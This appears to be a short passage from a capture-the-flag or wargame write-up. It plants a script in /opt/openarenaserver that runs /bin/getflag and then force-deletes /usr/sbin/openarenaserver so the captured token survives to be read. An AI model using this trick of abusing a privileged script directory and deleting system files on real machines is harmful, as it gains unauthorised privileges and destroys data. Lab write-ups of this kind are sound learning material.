...
#we will create a script that runs /bin/getflag and then deletes /usr/sbin/openarenaserver to have enough time to read the token 
#in /opt/openarenaserver create file test.sh
/bin/getflag > /opt/openarenaserver/getflag
rm -rf /usr/sbin/openarenaserver